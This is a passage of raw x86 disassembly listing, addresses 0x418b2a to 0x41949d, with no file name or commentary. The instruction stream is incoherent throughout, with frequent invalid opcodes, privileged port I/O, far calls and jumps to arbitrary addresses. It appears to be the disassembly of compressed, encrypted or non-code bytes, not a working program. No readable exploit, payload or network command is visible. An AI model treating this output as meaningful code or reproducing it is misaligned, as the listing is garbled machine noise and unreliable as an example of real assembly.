  418b2a:	jo     0x418ac4
  418b2c:	ror    DWORD PTR [ebp-0x3ae60e42],0x67
  418b33:	not    BYTE PTR [edx-0x6e565bc0]
  418b39:	neg    DWORD PTR [ebx+ebx*8]
  418b3c:	and    dh,BYTE PTR [eax]
  418b3e:	sub    al,0x5b
  418b40:	cli    
  418b41:	(bad)  
  418b42:	loopne 0x418ad9
  418b44:	ds jo  0x418ae3
  418b47:	push   edx
  418b48:	daa    
  418b49:	mov    ebp,0x198b21f9
  418b4e:	fisttp WORD PTR [eax+0x50]
  418b51:	cmc    
  418b52:	xor    DWORD PTR [ebx-0x63bff383],ebx
  418b58:	sbb    DWORD PTR [esi],esi
  418b5a:	push   edx
  418b5b:	lock push ss
  418b5d:	nop
  418b5e:	pop    edi
  418b5f:	ror    BYTE PTR [ebx+0x48fa0d5],0x86
  418b66:	pop    es
  418b67:	jae    0x418be2
  418b69:	and    bl,BYTE PTR [eax-0x6671bb63]
  418b6f:	inc    esi
  418b70:	sar    BYTE PTR [ebp+0x67],0x2d
  418b74:	xor    ah,BYTE PTR [eax-0x76]
  418b77:	jne    0x418bef
  418b79:	push   ebx
  418b7a:	pop    ebp
  418b7b:	not    BYTE PTR [eax]
  418b7d:	jmp    0x418aff
  418b7f:	sub    DWORD PTR ds:0x9c55,0xf5eb790e
  418b88:	and    BYTE PTR [ecx],bl
  418b8a:	lods   al,BYTE PTR ds:[esi]
  418b8b:	mov    ds:0x1c202d74,eax
  418b90:	out    dx,eax
  418b91:	mov    ebp,0x8fc8db7d
  418b96:	dec    eax
  418b97:	cli    
  418b98:	xchg   esp,eax
  418b99:	mov    ds:0xaa4d6daf,al
  418b9e:	(bad)  
  418b9f:	std    
  418ba0:	sti    
  418ba1:	shr    BYTE PTR [eax-0x21],cl
  418ba4:	in     eax,dx
  418ba5:	sbb    bh,BYTE PTR [ecx+0x51ab5956]
  418bab:	addr16 loopne 0x418b74
  418bae:	xor    ah,bh
  418bb0:	xor    DWORD PTR [esi],edi
  418bb2:	imul   ebx,DWORD PTR [ebx],0xffffff97
  418bb5:	push   eax
  418bb6:	mov    esp,0x6e5d69b0
  418bbb:	and    eax,0xb9511e51
  418bc0:	xor    eax,0xdfbfc998
  418bc5:	or     esi,DWORD PTR ds:0x8e9dd54e
  418bcb:	inc    ecx
  418bcc:	loope  0x418c2e
  418bce:	push   ecx
  418bcf:	icebp  
  418bd0:	jmp    0x30b785b6
  418bd5:	mov    ds:0x9a3cebb0,eax
  418bda:	and    BYTE PTR [ebx+0x3dd3e1cb],ah
  418be0:	push   es
  418be1:	stc    
  418be2:	pop    es
  418be3:	or     al,0xbe
  418be5:	xor    DWORD PTR [edx+0x31874eec],ebx
  418beb:	mov    dl,0x85
  418bed:	loop   0x418b96
  418bef:	daa    
  418bf0:	mov    bl,0x3f
  418bf2:	cli    
  418bf3:	sbb    al,0x13
  418bf5:	xchg   edi,eax
  418bf6:	and    DWORD PTR [eax-0x60873227],ecx
  418bfc:	hlt    
  418bfd:	cmp    BYTE PTR [edi],dl
  418bff:	call   eax
  418c01:	or     bh,BYTE PTR [eax+ebx*2-0x7d]
  418c05:	jbe    0x418ba3
  418c07:	(bad)  
  418c08:	div    DWORD PTR [ebx-0x3]
  418c0b:	mov    edx,0x793ae837
  418c10:	dec    esp
  418c11:	adc    edx,esp
  418c13:	jl     0x418be0
  418c15:	sub    edx,ebx
  418c17:	sub    DWORD PTR [ebp+0x6bfe4e81],eax
  418c1d:	pop    ecx
  418c1e:	jne    0x418ba3
  418c20:	xor    eax,DWORD PTR [edi+ebp*2+0x41]
  418c24:	xor    ch,dl
  418c26:	sub    al,0x5c
  418c28:	fdivr  QWORD PTR [eax+0x42728655]
  418c2e:	mov    eax,0x976e3292
  418c33:	sbb    al,0x3b
  418c35:	test   eax,0xbb74448c
  418c3a:	or     BYTE PTR [edi+0x13],ah
  418c3d:	ds loop 0x418bc4
  418c40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c41:	dec    ebx
  418c42:	cli    
  418c43:	pop    edx
  418c44:	xor    DWORD PTR [ecx],edi
  418c46:	cmp    BYTE PTR [si],dl
  418c49:	and    DWORD PTR [di+0x74],ebx
  418c4d:	stc    
  418c4e:	or     eax,0xcd6b72b8
  418c53:	push   cs
  418c54:	fiadd  WORD PTR [ebx]
  418c56:	lods   eax,DWORD PTR ds:[esi]
  418c57:	in     eax,dx
  418c58:	adc    eax,0x693ed101
  418c5d:	outs   dx,BYTE PTR ds:[esi]
  418c5e:	fbld   TBYTE PTR [eax-0x3e]
  418c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c62:	icebp  
  418c63:	ss pop ss
  418c65:	lods   eax,DWORD PTR ds:[esi]
  418c66:	jb     0x418c0a
  418c68:	inc    ebp
  418c69:	cmp    DWORD PTR [edx-0x1ad45775],esp
  418c6f:	sbb    ch,BYTE PTR [ecx+0x325d78c3]
  418c75:	cs mov bh,0xf2
  418c78:	aas    
  418c79:	push   esi
  418c7a:	xlat   BYTE PTR ds:[ebx]
  418c7b:	mov    ebx,0x523a93ac
  418c80:	in     eax,dx
  418c81:	dec    edi
  418c82:	pop    esi
  418c83:	es pop ebx
  418c85:	pop    es
  418c86:	inc    edx
  418c87:	les    ecx,FWORD PTR [esp+edi*1]
  418c8a:	jno    0x418c78
  418c8c:	jno    0x418cb7
  418c8e:	popa   
  418c8f:	lods   eax,DWORD PTR ds:[esi]
  418c90:	mov    bh,0xf9
  418c92:	pop    ecx
  418c93:	call   0x47fe:0x3676ee3f
  418c9a:	push   es
  418c9b:	dec    edx
  418c9c:	add    DWORD PTR [ecx],ebp
  418c9e:	ret    
  418c9f:	out    dx,eax
  418ca0:	jne    0x418cf4
  418ca2:	and    bl,dh
  418ca4:	or     eax,0x86a47202
  418ca9:	push   ebp
  418caa:	xlat   BYTE PTR ds:[ebx]
  418cab:	ja     0x418c8c
  418cad:	out    dx,al
  418cae:	pop    esi
  418caf:	inc    esp
  418cb0:	std    
  418cb1:	adc    eax,0x7600b637
  418cb6:	cmp    esi,DWORD PTR [esi-0x73]
  418cb9:	dec    esi
  418cba:	fs sbb al,0x8c
  418cbd:	mov    ebx,0xfe1e1566
  418cc2:	fst    st(2)
  418cc4:	pop    ebx
  418cc5:	mov    ebx,0x86f9c73e
  418cca:	inc    esi
  418ccb:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  418ccd:	aas    
  418cce:	(bad)  
  418ccf:	leave  
  418cd0:	sub    BYTE PTR ds:0x732629b5,bl
  418cd6:	adc    BYTE PTR [eax-0x169825b3],ch
  418cdc:	sbb    al,0x5b
  418cde:	ja     0x418c88
  418ce0:	jno    0x418c91
  418ce2:	je     0x418d4c
  418ce4:	inc    ecx
  418ce5:	inc    edx
  418ce6:	and    eax,0xdd32dbbd
  418ceb:	sub    al,0x53
  418ced:	jmp    0x418d28
  418cef:	aas    
  418cf0:	push   esi
  418cf1:	add    eax,ebp
  418cf3:	pop    es
  418cf4:	xlat   BYTE PTR ds:[ebx]
  418cf5:	sbb    ecx,DWORD PTR [eax]
  418cf7:	les    esi,FWORD PTR [edi+0x44294f0a]
  418cfd:	jecxz  0x418d79
  418cff:	stos   BYTE PTR es:[edi],al
  418d00:	cvtps2pi mm6,QWORD PTR [eax+0x7bab51aa]
  418d07:	add    dl,BYTE PTR [esi+0x17450ae8]
  418d0d:	dec    BYTE PTR [edi-0x3ea471ca]
  418d13:	push   0xffffffa4
  418d15:	cdq    
  418d16:	retf   
  418d17:	dec    eax
  418d18:	cmp    BYTE PTR [ebx+0x15ff2de0],bl
  418d1e:	aad    0x2c
  418d20:	in     al,0x23
  418d22:	xchg   edx,eax
  418d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d24:	and    al,0xb3
  418d26:	sti    
  418d27:	cld    
  418d28:	(bad)  
  418d29:	lods   al,BYTE PTR ds:[esi]
  418d2a:	push   ebp
  418d2b:	ror    esi,1
  418d2d:	pop    es
  418d2e:	loope  0x418d60
  418d30:	or     eax,0x38817b8c
  418d35:	aaa    
  418d36:	les    edi,FWORD PTR ss:[eax-0x7b]
  418d3a:	mov    esp,ss
  418d3c:	xor    dh,BYTE PTR [ebp-0x103724f6]
  418d42:	(bad)  
  418d43:	fld    TBYTE PTR [esi-0x637affae]
  418d49:	dec    ebp
  418d4a:	lahf   
  418d4b:	into   
  418d4c:	mov    ecx,0xb0593e2a
  418d51:	punpcklwd mm2,DWORD PTR ds:0x78d6a74c
  418d58:	aas    
  418d59:	xor    ecx,ecx
  418d5b:	cdq    
  418d5c:	add    BYTE PTR [ebp+0x6eaddf7f],cl
  418d62:	fidiv  WORD PTR [eax]
  418d64:	loopne 0x418d6d
  418d66:	dec    esi
  418d67:	pusha  
  418d68:	mov    ?,WORD PTR [bp+0x43bb]
  418d6d:	xor    ch,dl
  418d6f:	test   DWORD PTR [ebp-0x49],edi
  418d72:	stos   BYTE PTR es:[edi],al
  418d73:	and    al,0x85
  418d75:	(bad)  
  418d77:	mov    cl,cl
  418d79:	aad    0x5f
  418d7b:	mov    ds:0x2ed65439,al
  418d80:	pop    ebp
  418d81:	mov    ch,0xc1
  418d83:	mov    eax,0xf7a0785c
  418d88:	outs   dx,DWORD PTR ds:[esi]
  418d89:	add    BYTE PTR [ecx+0x2e],ch
  418d8c:	out    dx,al
  418d8d:	daa    
  418d8e:	add    eax,0x2d0b56d9
  418d93:	adc    DWORD PTR [ebp-0x53ad3bef],esi
  418d99:	sar    ebx,0xc8
  418d9c:	push   cs
  418d9d:	aam    0x7e
  418d9f:	mov    cl,0x84
  418da1:	fstp   DWORD PTR [ebx-0x3d]
  418da4:	mov    edi,0xa92b04e3
  418da9:	fwait
  418daa:	sub    eax,0xc9d416c
  418daf:	xchg   ecx,eax
  418db0:	leave  
  418db1:	xchg   edx,eax
  418db2:	inc    edi
  418db3:	xor    edi,DWORD PTR [esi]
  418db5:	je     0x418d38
  418db7:	dec    edx
  418db8:	ins    DWORD PTR es:[edi],dx
  418db9:	jno    0x418db6
  418dbb:	xchg   ecx,eax
  418dbc:	jae    0x418d3e
  418dbe:	jno    0x418dea
  418dc0:	xchg   ebx,eax
  418dc1:	in     al,dx
  418dc2:	scas   eax,DWORD PTR es:[edi]
  418dc3:	mov    ds:0x34828d43,eax
  418dc8:	sub    DWORD PTR [esi+0x1734a34e],edi
  418dce:	fiadd  WORD PTR [edi]
  418dd0:	cmc    
  418dd1:	into   
  418dd2:	test   al,0x7
  418dd4:	mov    esp,0x80acfe4c
  418dd9:	pop    ebp
  418dda:	and    edi,edx
  418ddc:	xor    BYTE PTR [ecx+0x53d72bfb],cl
  418de2:	mov    edx,0xa327b4c3
  418de7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418de8:	inc    esp
  418de9:	mov    bh,0x7d
  418deb:	pop    esp
  418dec:	retf   0xcf
  418def:	push   esp
  418df0:	jmp    0x418e2b
  418df2:	jo     0x418e3a
  418df4:	cmp    eax,0xf7a47274
  418df9:	sub    dl,dl
  418dfb:	dec    ebp
  418dfc:	sbb    BYTE PTR [ebx+0x2e61396e],bl
  418e02:	test   DWORD PTR [edx+0x61],edx
  418e05:	scas   al,BYTE PTR es:[edi]
  418e06:	ins    BYTE PTR es:[edi],dx
  418e07:	aaa    
  418e08:	jae    0x418dad
  418e0a:	cmp    al,0xb
  418e0c:	jno    0x418e30
  418e0e:	test   edx,edi
  418e10:	add    bh,BYTE PTR [ebp+0x42]
  418e13:	mov    cl,0xc5
  418e15:	pop    ss
  418e16:	ror    BYTE PTR [edi],1
  418e18:	ss ret 0xf117
  418e1c:	xor    dh,BYTE PTR [ebp-0x572c97c3]
  418e22:	push   ds
  418e23:	popf   
  418e24:	mov    ds:0xeefbfee3,eax
  418e29:	or     ebp,ebx
  418e2b:	sub    bl,dl
  418e2d:	jmp    0x418e41
  418e2f:	fdiv   st,st(2)
  418e31:	dec    edx
  418e32:	jge    0x418de8
  418e34:	pop    ds
  418e35:	std    
  418e36:	fisttp DWORD PTR [eax-0x5c]
  418e39:	sub    ebx,ebx
  418e3b:	inc    esi
  418e3c:	xor    esp,0x406f5a96
  418e42:	sbb    DWORD PTR [edi+0x13],0x79
  418e46:	loopne 0x418e7f
  418e48:	scas   al,BYTE PTR es:[edi]
  418e49:	add    esi,ebx
  418e4b:	dec    ebp
  418e4c:	mov    ebx,0x85352a3c
  418e51:	hlt    
  418e52:	daa    
  418e53:	fadd   DWORD PTR [ecx]
  418e55:	xor    al,0x46
  418e57:	int    0x27
  418e59:	jns    0x418e6e
  418e5b:	ss or  al,0x5e
  418e5e:	pop    edx
  418e5f:	pop    ecx
  418e60:	xlat   BYTE PTR ds:[ebx]
  418e61:	ins    DWORD PTR es:[edi],dx
  418e62:	jmp    DWORD PTR [eax-0x7c875c8e]
  418e68:	inc    esi
  418e69:	pop    ebx
  418e6a:	xchg   edx,eax
  418e6b:	mov    ecx,0x9cac42f5
  418e70:	dec    esi
  418e71:	aas    
  418e72:	nop
  418e73:	mov    edi,0x7737a9ea
  418e78:	call   0xa565:0x4c3b5d49
  418e7f:	lock jmp 0x68b006ff
  418e85:	shl    BYTE PTR [eax+ecx*4],0x97
  418e89:	mov    cl,BYTE PTR [edx+0x17404f0f]
  418e8f:	cmp    edi,ebp
  418e91:	mov    ebp,0x1eab8beb
  418e96:	push   es
  418e97:	std    
  418e98:	inc    esi
  418e99:	fdivr  st,st(1)
  418e9b:	and    dl,BYTE PTR [edx]
  418e9d:	lahf   
  418e9e:	mov    al,0x3f
  418ea0:	(bad)  
  418ea1:	(bad)  
  418ea2:	icebp  
  418ea3:	jae    0x418ea9
  418ea5:	rcr    DWORD PTR [ebx+0x2ac6c3e7],0xd8
  418eac:	aad    0xbb
  418eae:	or     BYTE PTR [ecx+0x29],dh
  418eb1:	ficom  WORD PTR [eax+eiz*2+0x3]
  418eb5:	jbe    0x418e7b
  418eb7:	adc    DWORD PTR [esi+0x75],esi
  418eba:	jne    0x418f16
  418ebc:	jb     0x418f16
  418ebe:	and    esp,DWORD PTR [eax+0x363f8db1]
  418ec4:	xor    eax,0x80136dac
  418ec9:	dec    ecx
  418eca:	push   eax
  418ecb:	xchg   edx,eax
  418ecc:	dec    eax
  418ecd:	xor    edx,DWORD PTR [edx-0x48722dbe]
  418ed3:	adc    cl,BYTE PTR [edx+eiz*8]
  418ed6:	jg     0x418ec9
  418ed8:	call   0x9821:0x421b28ba
  418edf:	or     ecx,DWORD PTR [eax+0xa17436a]
  418ee5:	cmp    al,0x93
  418ee7:	or     al,0xc5
  418ee9:	lahf   
  418eea:	sbb    ch,bh
  418eec:	and    BYTE PTR [eax+0x3e12f638],ch
  418ef2:	(bad)  
  418ef3:	mov    ds:0xec0d29f0,al
  418ef8:	xor    BYTE PTR [ebp-0x6a],al
  418efb:	mov    al,0x90
  418efd:	cwde   
  418efe:	xchg   esi,eax
  418eff:	loope  0x418ebc
  418f01:	sub    DWORD PTR [eax+0x3ef5f0b8],ebp
  418f07:	pop    ebp
  418f08:	fsub   st(6),st
  418f0a:	jp     0x418eb0
  418f0c:	and    ebx,DWORD PTR [edi-0xc]
  418f0f:	push   edi
  418f10:	mov    bl,BYTE PTR [eax]
  418f12:	rol    DWORD PTR [esi],1
  418f14:	out    dx,al
  418f15:	pushf  
  418f16:	(bad)  
  418f17:	fistp  WORD PTR [esi+0x3688b9fd]
  418f1d:	lock test eax,0x2ff9ca81
  418f23:	fst    st(0)
  418f25:	add    DWORD PTR [esi],0x61
  418f28:	or     ah,BYTE PTR [edi]
  418f2a:	stc    
  418f2b:	cmp    al,0x95
  418f2d:	pop    ebp
  418f2e:	loopne 0x418eca
  418f30:	sub    ah,BYTE PTR [edi-0x4d0af9ea]
  418f36:	arpl   WORD PTR [esi-0x24],ax
  418f39:	fisttp QWORD PTR [edi+0x21be8be3]
  418f3f:	sub    DWORD PTR [edi-0x1],edx
  418f42:	(bad)  
  418f43:	nop
  418f44:	dec    ecx
  418f45:	push   esp
  418f46:	pop    edx
  418f47:	arpl   WORD PTR ds:0xa74c38fd,dx
  418f4d:	mov    edi,edi
  418f4f:	adc    ebx,edi
  418f51:	jno    0x418f08
  418f53:	push   esi
  418f54:	ror    ebx,cl
  418f56:	std    
  418f57:	inc    edx
  418f58:	es sbb eax,0x56abeacf
  418f5e:	cmc    
  418f5f:	adc    dh,cl
  418f61:	js     0x418f7d
  418f63:	cld    
  418f64:	mov    al,ds:0xe5afbe25
  418f69:	and    BYTE PTR [esi],dl
  418f6b:	mov    cl,0x88
  418f6d:	repz or DWORD PTR [ebx+0xf8da596],0xffffff84
  418f75:	repnz and eax,0x9f55c538
  418f7b:	cmp    eax,DWORD PTR [ebx+0xdc9a9d3]
  418f81:	stc    
  418f82:	pop    ebx
  418f83:	inc    eax
  418f84:	jge    0x418fa0
  418f86:	mov    bl,0x6
  418f88:	push   ebx
  418f89:	fwait
  418f8a:	mov    esp,DWORD PTR [esi-0x1b]
  418f8d:	mov    ah,0xba
  418f8f:	push   cs
  418f90:	int3   
  418f91:	mov    bl,0x60
  418f93:	scas   eax,DWORD PTR es:[edi]
  418f94:	jmp    0x418f9e
  418f96:	lds    ecx,FWORD PTR [edi-0x59]
  418f99:	ss xchg ebx,eax
  418f9b:	and    bl,ch
  418f9d:	xchg   BYTE PTR [esp+edi*1+0x70],dl
  418fa1:	pop    edi
  418fa2:	xchg   BYTE PTR [edi],dh
  418fa4:	gs loope 0x418fce
  418fa7:	neg    BYTE PTR [edx]
  418fa9:	sub    eax,0x3f1df723
  418fae:	xchg   edi,eax
  418faf:	stos   DWORD PTR es:[edi],eax
  418fb0:	or     bl,ah
  418fb2:	jno    0x419012
  418fb4:	nop
  418fb5:	rol    dh,0x7c
  418fb8:	jne    0x418fc9
  418fba:	and    eax,0x5bf6f675
  418fbf:	test   BYTE PTR [ebx+0x2a],dh
  418fc2:	dec    edx
  418fc3:	(bad)  
  418fc4:	cmc    
  418fc5:	fcmove st,st(6)
  418fc7:	sbb    ch,BYTE PTR [ebx-0x646b0abe]
  418fcd:	cmc    
  418fce:	xchg   edx,eax
  418fcf:	rol    DWORD PTR [ecx+0x4a],1
  418fd2:	xchg   ecx,eax
  418fd3:	(bad)  
  418fd5:	aam    0xf8
  418fd7:	jecxz  0x41902d
  418fd9:	out    0xef,eax
  418fdb:	jo     0x418ffd
  418fdd:	cmp    cl,BYTE PTR [edi-0x6a]
  418fe0:	lds    ebp,FWORD PTR [edx]
  418fe2:	(bad)  
  418fe3:	ret    0x1ac7
  418fe6:	call   0x3929d0a3
  418feb:	cmp    ecx,ecx
  418fed:	cmc    
  418fee:	scas   al,BYTE PTR es:[edi]
  418fef:	push   eax
  418ff0:	(bad)  
  418ff1:	in     eax,dx
  418ff2:	add    al,0xbb
  418ff4:	scas   al,BYTE PTR es:[edi]
  418ff5:	inc    esp
  418ff6:	(bad)  
  418ff7:	test   BYTE PTR ds:0x1606879c,0xb8
  418ffe:	pop    ds
  418fff:	sub    DWORD PTR [edx-0xc6fa8b],0xfffffff7
  419006:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419007:	aaa    
  419008:	mov    edi,DWORD PTR [eax]
  41900a:	dec    eax
  41900b:	mov    edi,DWORD PTR [ecx+0x3af8ad6b]
  419011:	lds    esp,FWORD PTR [edx+0x6f]
  419014:	sar    ebp,0x8e
  419017:	jae    0x418f9b
  419019:	push   esp
  41901a:	into   
  41901b:	ret    
  41901c:	in     al,0xac
  41901e:	pop    esp
  41901f:	sbb    esp,DWORD PTR ss:[ebp+0x40]
  419023:	push   edx
  419024:	pop    eax
  419025:	pop    es
  419026:	xchg   DWORD PTR [edx-0x4b],ecx
  419029:	push   ebp
  41902a:	inc    esp
  41902b:	and    bh,dh
  41902d:	sub    BYTE PTR [ecx],dh
  41902f:	mov    cl,0x51
  419031:	sbb    BYTE PTR ds:0xe35dca5c,0xcf
  419038:	xchg   esi,eax
  419039:	je     0x418ff4
  41903b:	add    esp,esi
  41903d:	jb     0x419016
  41903f:	cmc    
  419040:	ret    0x1728
  419043:	stc    
  419044:	in     al,dx
  419045:	inc    edi
  419046:	cmp    BYTE PTR [esi-0x6d],ch
  419049:	pop    es
  41904a:	xor    dl,BYTE PTR [edx-0x3cdca19a]
  419050:	jecxz  0x41901f
  419052:	xchg   ebp,eax
  419053:	test   BYTE PTR ds:0x726a1686,bh
  419059:	mov    esi,0x6a11ad62
  41905e:	push   ebx
  41905f:	and    BYTE PTR [eax+0x3d805ee6],0xc9
  419066:	push   ebp
  419067:	adc    DWORD PTR [edi],edi
  419069:	enter  0x64d9,0xef
  41906d:	lods   eax,DWORD PTR ds:[esi]
  41906e:	mov    edi,0xaf9570e8
  419073:	aam    0x8e
  419075:	popf   
  419076:	das    
  419077:	je     0x419040
  419079:	fwait
  41907a:	popa   
  41907b:	out    dx,al
  41907c:	and    eax,0x3a378560
  419081:	pop    edi
  419082:	mov    edx,0x83bb84c5
  419087:	inc    eax
  419088:	push   ss
  419089:	dec    ebp
	...
  41925a:	shr    ah,cl
  41925c:	and    edx,DWORD PTR [ecx]
  41925e:	aas    
  41925f:	fcomip st,st(2)
  419261:	out    dx,eax
  419262:	or     DWORD PTR [esi-0xa901533],ebp
  419268:	jge    0x419243
  41926a:	adc    ecx,esp
  41926c:	add    DWORD PTR [eax],eax
  41926e:	push   ds
  41926f:	pop    es
  419270:	add    BYTE PTR [eax],al
  419272:	dec    esi
  419273:	xchg   esp,eax
  419274:	popf   
  419275:	out    dx,eax
  419276:	xchg   ecx,eax
  419277:	xchg   ebx,eax
  419278:	rcr    ch,1
  41927a:	adc    al,BYTE PTR [edi-0x185c7a2e]
  419280:	int    0x80
  419282:	jg     0x41922e
  419284:	enter  0x4541,0x64
  419288:	les    ebx,FWORD PTR [edi-0x7c52b8ab]
  41928e:	jb     0x419255
  419290:	dec    ebp
  419291:	icebp  
  419292:	in     eax,0x94
  419294:	scas   al,BYTE PTR es:[edi]
  419295:	push   ds
  419296:	test   DWORD PTR [ecx+0x79],edi
  419299:	out    0xb6,eax
  41929b:	xchg   esi,eax
  41929c:	jp     0x41927d
  41929e:	gs sti 
  4192a0:	(bad)  
  4192a2:	shl    BYTE PTR [esp+esi*2-0x2d481bcf],0xfb
  4192aa:	sbb    eax,0xa1c38212
  4192af:	inc    ecx
  4192b0:	(bad)  
  4192b1:	inc    DWORD PTR [edi+0x272ebace]
  4192b7:	mov    ch,0x55
  4192b9:	dec    edi
  4192ba:	xchg   ecx,eax
  4192bb:	cwde   
  4192bc:	cs daa 
  4192be:	push   edx
  4192bf:	aad    0x4b
  4192c1:	test   BYTE PTR [esi-0x31],cl
  4192c4:	and    BYTE PTR [ecx-0x822de15],bh
  4192ca:	push   cs
  4192cb:	jecxz  0x4192d6
  4192cd:	cli    
  4192ce:	add    al,0x90
  4192d0:	cmp    al,0x99
  4192d2:	cli    
  4192d3:	cmc    
  4192d4:	ret    0x8e5c
  4192d7:	jne    0x4192a0
  4192d9:	add    eax,0x21d102d4
  4192de:	sub    al,0x55
  4192e0:	das    
  4192e1:	jecxz  0x4192b2
  4192e3:	jecxz  0x4192d4
  4192e5:	adc    DWORD PTR [edx],ecx
  4192e7:	aam    0xeb
  4192e9:	sti    
  4192ea:	pop    ss
  4192eb:	div    dl
  4192ed:	xor    ecx,DWORD PTR [ebx+edi*2+0x62]
  4192f1:	jae    0x4192cc
  4192f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f4:	into   
  4192f5:	mov    ds:0xafc3db4e,al
  4192fa:	test   DWORD PTR [edx+0x64f49874],eax
  419300:	push   0xa1ca95b3
  419305:	sbb    bh,BYTE PTR [edi]
  419307:	popf   
  419308:	mov    esi,0x62b917a5
  41930d:	jmp    0xa5ade9c3
  419312:	test   al,0xcf
  419314:	xor    BYTE PTR [edx],cl
  419316:	xlat   BYTE PTR ds:[ebx]
  419317:	dec    esp
  419318:	jmp    0x605c6719
  41931d:	push   es
  41931e:	mov    bl,BYTE PTR [edx+0x523dd081]
  419324:	or     ch,BYTE PTR [ecx+0x14]
  419327:	sub    eax,0xda9d0637
  41932c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41932d:	jmp    0x62c1:0x507187fc
  419334:	sub    BYTE PTR [esi-0x68],cl
  419337:	pop    edx
  419338:	mov    dh,0x44
  41933a:	fistp  DWORD PTR [ebp+0x2ea8829d]
  419340:	std    
  419341:	addr16 jae 0x41931b
  419344:	aam    0xc5
  419346:	into   
  419347:	xor    ecx,DWORD PTR [ebx+0x5b4cf24a]
  41934d:	add    ebp,eax
  41934f:	shl    DWORD PTR [ebp+0x3bc24be1],1
  419355:	mov    WORD PTR [ecx],gs
  419357:	xlat   BYTE PTR ds:[ebx]
  419358:	sub    dl,BYTE PTR [eax+0x2847df50]
  41935e:	xchg   ebx,eax
  41935f:	xchg   DWORD PTR [edi],esp
  419361:	cmp    eax,0x41083305
  419366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419367:	call   0x9efd:0xe9afa805
  41936e:	mov    ds:0xa75c67e3,al
  419373:	sbb    bh,cl
  419375:	xor    eax,0x647bf9f9
  41937a:	sti    
  41937b:	out    0x4c,eax
  41937d:	rcl    BYTE PTR [edi+0x49d07fa9],cl
  419383:	jmp    0x22c5:0x5e9f6e72
  41938a:	ds aas 
  41938c:	(bad)  
  41938d:	lock pop ss
  41938f:	jmp    0xf35d73b3
  419394:	ficomp WORD PTR [bx+di]
  419397:	dec    edx
  419398:	(bad)  
  419399:	cmc    
  41939a:	cmp    BYTE PTR [edi],dh
  41939c:	shl    DWORD PTR [ebx+0x32],1
  41939f:	arpl   WORD PTR [esi],si
  4193a1:	stos   BYTE PTR es:[edi],al
  4193a2:	cli    
  4193a3:	adc    eax,0xa47be15d
  4193a8:	jno    0x4193f4
  4193aa:	and    bh,BYTE PTR [ebp-0x59d73649]
  4193b0:	dec    ecx
  4193b1:	ins    BYTE PTR es:[edi],dx
  4193b2:	pop    edx
  4193b3:	jge    0x41941e
  4193b5:	xchg   ebx,eax
  4193b6:	jl     0x419395
  4193b8:	cmp    cl,BYTE PTR [edx-0x2e]
  4193bb:	nop
  4193bc:	mov    eax,0x6e807717
  4193c1:	pop    ecx
  4193c2:	mov    cl,BYTE PTR [ebp-0x7c]
  4193c5:	and    eax,0xb3665578
  4193ca:	popf   
  4193cb:	xchg   BYTE PTR [edx+0x55],bl
  4193ce:	imul   esp,DWORD PTR [eax+0x515207aa],0xffffff84
  4193d5:	push   edi
  4193d6:	out    dx,eax
  4193d7:	and    esp,DWORD PTR [ebx+0x4606e3cf]
  4193dd:	or     ecx,ecx
  4193df:	jmp    0x41936e
  4193e1:	xchg   esi,eax
  4193e2:	fsub   st(7),st
  4193e4:	cmc    
  4193e5:	stos   BYTE PTR es:[edi],al
  4193e6:	bound  ebx,QWORD PTR [ebx]
  4193e8:	and    eax,ecx
  4193ea:	cmp    BYTE PTR [ebx-0x68],bh
  4193ed:	(bad)  
  4193ee:	mov    ebp,DWORD PTR [edx+eiz*1]
  4193f1:	xchg   ebp,eax
  4193f2:	pop    es
  4193f3:	cmp    dh,BYTE PTR [edi+esi*1]
  4193f6:	pop    eax
  4193f7:	ja     0x41942b
  4193f9:	push   ecx
  4193fa:	jns    0x419453
  4193fc:	cli    
  4193fd:	call   DWORD PTR [ebx]
  4193ff:	sbb    eax,0xf2d1d00e
  419404:	jmp    0xa2e7d5b4
  419409:	ss xchg edx,eax
  41940b:	enter  0xb502,0xe0
  41940f:	sub    al,0x37
  419411:	xchg   edi,eax
  419412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419413:	jno    0x41944b
  419415:	add    esp,DWORD PTR [edi-0x77]
  419418:	mov    DWORD PTR [edx-0x59],esp
  41941b:	add    BYTE PTR [ebp-0x16],dh
  41941e:	test   al,0xa1
  419420:	int3   
  419421:	sar    DWORD PTR [ecx+0x48],1
  419424:	xor    DWORD PTR [edi-0x9],edx
  419427:	and    DWORD PTR [eax-0x4e],ebx
  41942a:	aam    0xc2
  41942c:	sbb    BYTE PTR [ebx-0x3c7088cb],bh
  419432:	jl     0x4193e8
  419434:	cmp    ebx,0x24822abb
  41943a:	add    al,0x56
  41943c:	pop    ds
  41943d:	or     cl,BYTE PTR [eax]
  41943f:	pop    esp
  419440:	jns    0x419447
  419442:	int3   
  419443:	push   esp
  419444:	mov    ah,0xbb
  419446:	push   es
  419447:	jo     0x41946d
  419449:	aam    0xde
  41944b:	push   ss
  41944c:	add    BYTE PTR [eax+0xb6e3d66],dh
  419452:	icebp  
  419453:	fisub  WORD PTR ds:0x36a581bc
  419459:	lahf   
  41945a:	inc    ebp
  41945b:	adc    DWORD PTR [eax],0x1fddb88c
  419461:	aad    0xcf
  419463:	es mov bl,0xbe
  419466:	mov    edx,0x68c50cf4
  41946b:	lods   eax,DWORD PTR ds:[esi]
  41946c:	push   eax
  41946d:	mov    ds:0x93044c7a,eax
  419472:	inc    esi
  419473:	or     DWORD PTR [edi-0x4a],ebp
  419476:	repnz pushf 
  419478:	dec    ebp
  419479:	mov    bh,0xdc
  41947b:	mov    ?,ebp
  41947d:	jl     0x4194bc
  41947f:	sbb    ch,BYTE PTR [ebp+0x6d]
  419482:	es push 0x46
  419485:	out    0xfe,al
  419487:	fwait
  419488:	or     al,0xb9
  41948a:	mov    ecx,esp
  41948c:	stos   DWORD PTR es:[edi],eax
  41948d:	mov    al,0x28
  41948f:	jne    0x419414
  419491:	mov    eax,0x208bc918
  419496:	leave  
  419497:	pop    ss
  419498:	not    BYTE PTR [edx-0x50]
  41949b:	cld    
  41949c:	out    dx,al
  41949d:	jmp    0x27579c6e
